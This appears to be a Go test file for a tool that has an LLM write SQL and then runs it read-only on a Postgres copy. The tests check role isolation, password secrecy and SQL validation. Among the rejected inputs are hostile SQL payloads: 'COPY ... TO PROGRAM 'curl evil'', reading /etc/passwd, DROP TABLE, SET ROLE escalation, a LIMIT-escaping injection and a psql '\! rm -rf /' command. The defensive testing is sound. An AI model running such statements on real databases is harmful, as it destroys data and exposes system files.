package main

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"strings"
	"testing"
	"time"

	"github.com/juan52878911/kindling/ext/db/internal/askllm"
)

// fakeProvider apunta lo que recibe y contesta por turnos.
type fakeProvider struct {
	answers []string
	prompts []string
	err     error
}

func (p *fakeProvider) Name() string { return "fake model" }

func (p *fakeProvider) Complete(_ context.Context, system, prompt string) (string, error) {
	p.prompts = append(p.prompts, system+"\n---\n"+prompt)
	if p.err != nil {
		return "", p.err
	}
	if len(p.answers) == 0 {
		return "", errors.New("fake provider: no more answers")
	}
	a := p.answers[0]
	p.answers = p.answers[1:]
	return a, nil
}

// askKling se pone delante del kling falso: los exec de ask los contesta él
// (el falso los tomaría por rotaciones) y apunta argv y stdin.
type askKling struct {
	*fakeKling
	execs    []call
	problems string // respuesta de la comprobación del rol (JSON)
	schema   string
	csv      string
	queryErr error
}

func (k *askKling) Run(ctx context.Context, stdin io.Reader, args ...string) ([]byte, error) {
	if len(args) == 0 || args[0] != "exec" {
		return k.fakeKling.Run(ctx, stdin, args...)
	}
	var in []byte
	if stdin != nil {
		in, _ = io.ReadAll(stdin)
	}
	k.execs = append(k.execs, call{args: append([]string(nil), args...), stdin: string(in)})
	cmd := strings.Join(args[indexOf(args, "--")+1:], " ")
	switch {
	case strings.HasSuffix(cmd, "sh -s"):
		return nil, nil
	case strings.Contains(string(in), "CREATE ROLE"):
		return nil, nil
	case strings.Contains(string(in), "FROM pg_roles WHERE rolname"):
		return []byte(k.problems + "\n"), nil
	case strings.Contains(cmd, "--csv"):
		if k.queryErr != nil {
			return nil, k.queryErr
		}
		return []byte(k.csv), nil
	case strings.Contains(cmd, "-U "):
		return []byte(k.schema + "\n"), nil
	}
	return nil, fmt.Errorf("askKling: unexpected exec %v", args)
}

const testSchema = `[{"schema":"public","name":"customers","kind":"table","columns":[{"name":"name","type":"text"}]}]`

// newAskApp: una copia lista "c1" y el kling de ask delante.
func newAskApp(t *testing.T) (*testApp, *askKling, string) {
	t.Helper()
	ta := newTestApp(t)
	mc, err := ta.up(ctx, "pg", "c1", 0, "local")
	if err != nil {
		t.Fatal(err)
	}
	k := &askKling{fakeKling: ta.f, problems: "[]", schema: testSchema, csv: "name\nana\nluis\n"}
	ta.app.k = k
	return ta, k, password(t, mc.ID)
}

func defaultAskOpts() askOpts {
	return askOpts{yes: true, model: askllm.DefaultModel, limit: 200, timeout: 30 * time.Second, llmTime: 90 * time.Second}
}

// queryExecs son los exec que llevan la sentencia del modelo.
func queryExecs(k *askKling, sql string) []call {
	var out []call
	for _, c := range k.execs {
		if strings.Contains(c.stdin, sql) {
			out = append(out, c)
		}
	}
	return out
}

// assertEncerrada: cada exec que lleva sql entra como el rol ro (no como el
// superusuario), en solo lectura desde la conexión, y su stdin abre una
// transacción READ ONLY con plazo, comprueba la sesión y envuelve la sentencia
// con LIMIT ANTES de que aparezca nada del modelo.
func assertEncerrada(t *testing.T, k *askKling, ro, sql string, limit int) {
	t.Helper()
	execs := queryExecs(k, sql)
	if len(execs) != 1 {
		t.Fatalf("%d execs carry the SQL, want 1", len(execs))
	}
	c := execs[0]
	shell := c.args[len(c.args)-1]
	if !strings.Contains(shell, " -U "+ro+" ") || !strings.Contains(shell, "-h /run/postgresql") ||
		!strings.Contains(shell, "default_transaction_read_only=on") {
		t.Fatalf("the query does not log in as %s read-only: %q", ro, shell)
	}
	if got := c.args[indexOf(c.args, "--")+1:]; strings.Join(got[:4], " ") != "su -s /bin/sh postgres" || got[4] != "-c" {
		t.Fatalf("exec %v", got)
	}
	head := c.stdin[:strings.Index(c.stdin, sql)]
	for _, want := range []string{
		"BEGIN TRANSACTION READ ONLY;\n",
		"SET LOCAL statement_timeout = ",
		"session_user <> '" + ro + "'",
		"current_setting('is_superuser') <> 'off'",
		"current_setting('transaction_read_only') <> 'on'",
		"SELECT * FROM (\n",
	} {
		if !strings.Contains(head, want) {
			t.Fatalf("missing %q before the SQL:\n%s", want, c.stdin)
		}
	}
	if !strings.HasPrefix(c.stdin, "BEGIN TRANSACTION READ ONLY;") {
		t.Fatalf("stdin does not start with the read-only transaction:\n%s", c.stdin)
	}
	if tail := fmt.Sprintf("\n) q LIMIT %d;\nROLLBACK;\n", limit); !strings.HasSuffix(c.stdin, sql+tail) {
		t.Fatalf("the SQL is not wrapped with LIMIT %d:\n%s", limit, c.stdin)
	}
}

func TestAskFlujo(t *testing.T) {
	ta, k, pw := newAskApp(t)
	p := &fakeProvider{answers: []string{"```sql\nSELECT name FROM customers ORDER BY name;\n```"}}
	if err := ta.ask(ctx, "c1", "¿cómo se llaman los clientes?", "local", defaultAskOpts(), p); err != nil {
		t.Fatal(err)
	}
	out := ta.out.String()
	if !strings.Contains(out, "ana") || !strings.Contains(out, "luis") || !strings.Contains(out, "(2 rows)") {
		t.Fatalf("stdout:\n%s", out)
	}
	if !strings.Contains(ta.err.String(), "SELECT name FROM customers ORDER BY name") {
		t.Fatalf("the SQL was not shown:\n%s", ta.err.String())
	}
	// Al modelo: el esquema y la pregunta; ni la clave ni nada que no sea eso.
	if len(p.prompts) != 1 || !strings.Contains(p.prompts[0], testSchema) ||
		!strings.Contains(p.prompts[0], "¿cómo se llaman los clientes?") {
		t.Fatalf("prompts %q", p.prompts)
	}
	if strings.Contains(p.prompts[0], pw) || strings.Contains(p.prompts[0], "ana") {
		t.Fatal("the model got the password or data")
	}
	assertNoLeak(t, ta.f, pw)
	for _, c := range k.execs {
		if strings.Contains(strings.Join(c.args, " ")+c.stdin, pw) {
			t.Fatalf("password in exec %v", c.args)
		}
	}
	if strings.Contains(out+ta.err.String(), pw) {
		t.Fatal("password in the output")
	}
	// Orden: crear rol, comprobarlo, dejarle entrar, esquema, consulta.
	if len(k.execs) != 5 {
		t.Fatalf("%d execs, want 5", len(k.execs))
	}
	for i, want := range []string{"CREATE ROLE kling_db_ro", "rolname = 'kling_db_ro'", "local all kling_db_ro peer map=kling_db_ask", "has_table_privilege(c.oid, 'SELECT')", "SELECT name FROM customers"} {
		if !strings.Contains(k.execs[i].stdin, want) {
			t.Fatalf("exec %d does not carry %q:\n%s", i, want, k.execs[i].stdin)
		}
	}
	// El esquema también se lee como el rol de solo lectura y en READ ONLY.
	if sh := k.execs[3].args[len(k.execs[3].args)-1]; !strings.Contains(sh, "-U kling_db_ro ") ||
		!strings.HasPrefix(k.execs[3].stdin, "BEGIN TRANSACTION READ ONLY;") {
		t.Fatalf("schema read %q", sh)
	}
	assertEncerrada(t, k, "kling_db_ro", "SELECT name FROM customers ORDER BY name", 200)
}

func TestAskValidadorRechazaAntesDeEjecutar(t *testing.T) {
	for _, answer := range []string{
		"DELETE FROM customers",
		"SELECT 1; DROP TABLE customers",
		"WITH d AS (DELETE FROM customers RETURNING *) SELECT * FROM d",
		"SELECT pg_read_file('/etc/passwd')",
		"COPY customers TO PROGRAM 'curl evil'",
		"SELECT 1 /* */ ; SET ROLE postgres",
	} {
		ta, k, _ := newAskApp(t)
		err := ta.ask(ctx, "c1", "q", "local", defaultAskOpts(), &fakeProvider{answers: []string{answer}})
		if err == nil || !strings.Contains(err.Error(), "rejected SQL") {
			t.Fatalf("%q: err = %v", answer, err)
		}
		if len(queryExecs(k, answer)) != 0 {
			t.Fatalf("%q was sent to the copy", answer)
		}
	}
}

// Aun si el validador fallara (aquí se anula), lo que llega a la copia va
// como el rol de solo lectura, en una transacción READ ONLY, con plazo y
// envuelto en LIMIT; y nunca a un psql del superusuario.
func TestAskAunqueElValidadorFalle(t *testing.T) {
	orig := validateSQL
	validateSQL = func(string) error { return nil }
	t.Cleanup(func() { validateSQL = orig })

	for _, evil := range []string{
		"DELETE FROM customers",
		"SELECT 1) q; COMMIT; DROP TABLE customers; SELECT (1",
		"INSERT INTO customers VALUES ('x')",
		"SELECT set_config('role', 'postgres', false)",
	} {
		ta, k, _ := newAskApp(t)
		o := defaultAskOpts()
		o.limit = 7
		if err := ta.ask(ctx, "c1", "q", "local", o, &fakeProvider{answers: []string{evil}}); err != nil {
			t.Fatalf("%q: %v", evil, err)
		}
		assertEncerrada(t, k, "kling_db_ro", evil, 7)
		for _, c := range queryExecs(k, evil) {
			if strings.Contains(c.args[len(c.args)-1], psqlSuperDB("appdb")) {
				t.Fatalf("%q went to the superuser's psql", evil)
			}
		}
	}

	// La barra invertida (\! de psql) no pasa ni sin validador.
	ta, k, _ := newAskApp(t)
	evil := "SELECT 1\n\\! rm -rf /"
	err := ta.ask(ctx, "c1", "q", "local", defaultAskOpts(), &fakeProvider{answers: []string{evil}})
	if err == nil || len(queryExecs(k, "rm -rf")) != 0 {
		t.Fatalf("a psql meta-command reached the copy (err %v)", err)
	}
}

func TestAskConfirmacion(t *testing.T) {
	for answer, runs := range map[string]bool{"n\n": false, "\n": false, "": false, "y\n": true, "sí\n": true} {
		ta, k, _ := newAskApp(t)
		ta.app.stdin = strings.NewReader(answer)
		o := defaultAskOpts()
		o.yes = false
		err := ta.ask(ctx, "c1", "q", "local", o, &fakeProvider{answers: []string{"SELECT name FROM customers"}})
		ran := len(queryExecs(k, "SELECT name FROM customers")) == 1
		if ran != runs || (err == nil) != runs {
			t.Fatalf("answer %q: ran=%v err=%v", answer, ran, err)
		}
		if !strings.Contains(ta.err.String(), "SELECT name FROM customers") {
			t.Fatalf("the SQL was not shown before asking")
		}
	}
}

func TestAskRolQueNoEsDeSoloLectura(t *testing.T) {
	ta, k, _ := newAskApp(t)
	k.problems = `["is a superuser","owns or can write customers"]`
	p := &fakeProvider{answers: []string{"SELECT 1"}}
	err := ta.ask(ctx, "c1", "q", "local", defaultAskOpts(), p)
	if err == nil || !strings.Contains(err.Error(), "is a superuser") {
		t.Fatalf("err = %v", err)
	}
	if len(p.prompts) != 0 || len(k.execs) != 2 {
		t.Fatalf("went on after the check: %d prompts, %d execs", len(p.prompts), len(k.execs))
	}
}

func TestAskRolPropio(t *testing.T) {
	ta, k, _ := newAskApp(t)
	o := defaultAskOpts()
	o.role = "lector"
	if err := ta.ask(ctx, "c1", "q", "local", o, &fakeProvider{answers: []string{"SELECT name FROM customers"}}); err != nil {
		t.Fatal(err)
	}
	for _, c := range k.execs {
		if strings.Contains(c.stdin, "CREATE ROLE") {
			t.Fatal("-role must not create anything")
		}
	}
	assertEncerrada(t, k, "lector", "SELECT name FROM customers", 200)

	for _, bad := range []string{"app", "postgres"} {
		ta, _, _ := newAskApp(t)
		o.role = bad
		if err := ta.ask(ctx, "c1", "q", "local", o, &fakeProvider{}); err == nil {
			t.Fatalf("-role %s accepted", bad)
		}
	}
}

func TestAskCopiaAjenaONoLista(t *testing.T) {
	ta, k, _ := newAskApp(t)
	p := &fakeProvider{answers: []string{"SELECT 1"}}
	if err := ta.ask(ctx, "c1", "q", "otro", defaultAskOpts(), p); err == nil {
		t.Fatal("another owner's copy accepted")
	}
	for _, mc := range ta.f.machines {
		mc.Labels[labelState] = statePreparing
	}
	if err := ta.ask(ctx, "c1", "q", "local", defaultAskOpts(), p); err == nil {
		t.Fatal("a copy that is not ready accepted")
	}
	if len(p.prompts) != 0 || len(k.execs) != 0 {
		t.Fatal("touched the copy or the model")
	}
}

func TestAskExplainYJSON(t *testing.T) {
	ta, k, _ := newAskApp(t)
	var b strings.Builder
	b.WriteString("n\n")
	for i := 1; i <= 60; i++ {
		fmt.Fprintf(&b, "fila%02d\n", i)
	}
	k.csv = b.String()
	p := &fakeProvider{answers: []string{"SELECT n FROM customers", "Hay 60 filas."}}
	o := defaultAskOpts()
	o.explain, o.sendData, o.jsonOut = true, true, true
	if err := ta.ask(ctx, "c1", "q", "local", o, p); err != nil {
		t.Fatal(err)
	}
	if len(p.prompts) != 2 || !strings.Contains(p.prompts[1], "fila50") || strings.Contains(p.prompts[1], "fila51") {
		t.Fatalf("explain must send at most 50 rows")
	}
	if !strings.Contains(ta.err.String(), "sending 50 of 60 rows") {
		t.Fatalf("no warning that data leaves:\n%s", ta.err.String())
	}
	var res askResult
	if err := json.Unmarshal(ta.out.Bytes(), &res); err != nil {
		t.Fatalf("-json: %v\n%s", err, ta.out.String())
	}
	if len(res.Rows) != 60 || res.Columns[0] != "n" || res.Summary != "Hay 60 filas." || res.Role != "kling_db_ro" {
		t.Fatalf("result %+v", res)
	}
}

func TestAskOpcionesYSinClave(t *testing.T) {
	ok := defaultAskOpts()
	if err := ok.check("q"); err != nil {
		t.Fatal(err)
	}
	for name, o := range map[string]askOpts{
		"explain sin send-data": {llmTime: time.Minute, limit: 1, timeout: time.Second, explain: true},
		"send-data solo":        {llmTime: time.Minute, limit: 1, timeout: time.Second, sendData: true},
		"limit 0":               {llmTime: time.Minute, limit: 0, timeout: time.Second},
		"limit enorme":          {llmTime: time.Minute, limit: askMaxLimit + 1, timeout: time.Second},
		"timeout corto":         {llmTime: time.Minute, limit: 1, timeout: time.Millisecond},
		"rol raro":              {llmTime: time.Minute, limit: 1, timeout: time.Second, role: "x; drop"},
		"proveedor raro":        {llmTime: time.Minute, limit: 1, timeout: time.Second, provider: "gpt"},
		"llm-timeout 0":         {limit: 1, timeout: time.Second},
	} {
		if err := o.check("q"); err == nil {
			t.Errorf("%s: accepted", name)
		}
	}
	if err := ok.check(""); err == nil {
		t.Error("empty question accepted")
	}

	// Sin clave de la API, error claro y ni se toca la copia.
	t.Setenv(askllm.EnvKey, "")
	t.Setenv(askllm.EnvProvider, "")
	t.Setenv(askllm.EnvFake, "")
	t.Setenv("PATH", t.TempDir()) // sin opencode
	t.Setenv("HOME", t.TempDir())
	t.Setenv("KLING", "/nonexistent/kling")
	err := cmdAsk([]string{"c1", "¿cuántos clientes hay?"})
	if !errors.Is(err, askllm.ErrNoProvider) {
		t.Fatalf("err = %v, want ErrNoProvider", err)
	}
}

func TestAskUsoIncorrecto(t *testing.T) {
	for _, args := range [][]string{
		{"ask"},
		{"ask", "c1"},
		{"ask", "c1", "q", "-explain"},
		{"ask", "c1", "q", "-limit", "0"},
	} {
		if out, code := runExt(t, args...); code != 2 {
			t.Errorf("%v: exit %d, want 2\n%s", args, code, out)
		}
	}
}

func TestCeldaSinControl(t *testing.T) {
	got := cell("a\x1b[2Jb\nc" + strings.Repeat("x", 100))
	if strings.ContainsAny(got, "\x1b\n") || len([]rune(got)) != askCellWidth {
		t.Fatalf("cell %q", got)
	}
}

// La comprobación del rol rechaza CUALQUIER pertenencia salvo
// pg_read_all_data, con 'MEMBER' (no 'USAGE': en PG16 un GRANT ... WITH
// INHERIT FALSE da USAGE falso pero deja hacer SET ROLE), y mira también
// pg_auth_members directamente. La propiedad, igual, con 'MEMBER'.
func TestCheckRORolePertenencias(t *testing.T) {
	q := fmt.Sprintf(checkRORole, "kling_db_ro")
	if strings.Contains(q, "'USAGE'") {
		t.Fatal("pg_has_role with USAGE misses SET-only memberships")
	}
	if n := strings.Count(q, "'MEMBER')"); n != 3 {
		t.Fatalf("%d pg_has_role(..., 'MEMBER'), want 3 (membership, database owner, relation owner)", n)
	}
	for _, want := range []string{
		"s.rolname <> 'pg_read_all_data'",
		"FROM pg_auth_members m WHERE m.member = r.oid AND m.roleid = s.oid",
		"pg_has_role(r.oid, d.datdba, 'MEMBER')",
		"pg_has_role(r.oid, c.relowner, 'MEMBER')",
	} {
		if !strings.Contains(q, want) {
			t.Errorf("checkRORole lacks %q", want)
		}
	}
	// Nada de lista de roles "peligrosos": todo lo que no sea pg_read_all_data
	// es una pertenencia de más (app, pg_write_all_data, un rol cualquiera).
	for _, bad := range []string{"pg_write_all_data", "pg_execute_server_program", "s.rolsuper OR"} {
		if strings.Contains(q, bad) {
			t.Errorf("checkRORole still filters memberships by a list (%q)", bad)
		}
	}
}

// En Postgres real todo rol tiene UPDATE sobre pg_settings (es SET): la
// comprobación no puede tratarlo como escritura, o ningún rol pasaría nunca
// (lo encontró la prueba contra el lab; los tests con el kling falso no).
func TestCheckRORoleIgnoraPgSettings(t *testing.T) {
	if !strings.Contains(checkRORole, "c.oid <> 'pg_catalog.pg_settings'::regclass") {
		t.Fatal("checkRORole trataría el UPDATE de PUBLIC sobre pg_settings como escritura")
	}
	if strings.Count(checkRORole, "<> 'pg_catalog.") != 1 {
		t.Fatal("solo pg_settings puede quedar fuera de la comprobación de escritura")
	}
}

// Solo "no existe" de una tabla o columna vuelve al modelo, y rehecho a partir
// del identificador: el resto de la salida de psql no sale nunca.
func TestMissingIdentSoloTablasYColumnas(t *testing.T) {
	casos := []struct {
		err  string
		want string
		ok   bool
	}{
		{`kling exec: exit status 3: ERROR:  relation "productos" does not exist
LINE 2: FROM productos p`, "the relation productos does not exist", true},
		{`ERROR:  column "c.nombre" does not exist`, "the column c.nombre does not exist", true},
		{`ERROR:  column nombre does not exist`, "the column nombre does not exist", true},
		{`ERROR:  invalid input syntax for type integer: "4111 1111 1111 1111"`, "", false},
		{`ERROR:  permission denied for table invoices`, "", false},
		{`ERROR:  canceling statement due to statement timeout`, "", false},
	}
	for _, c := range casos {
		got, ok := missingIdent(errors.New(c.err))
		if ok != c.ok || got != c.want {
			t.Errorf("%q: got (%q, %v), want (%q, %v)", c.err, got, ok, c.want, c.ok)
		}
	}
	p := repairPrompt("{}", "¿cuántos?", "SELECT 1 FROM productos", "the relation productos does not exist")
	if !strings.Contains(p, "SELECT 1 FROM productos") || !strings.Contains(p, "productos does not exist") || strings.Contains(p, "LINE 2") {
		t.Fatalf("repairPrompt = %q", p)
	}
}
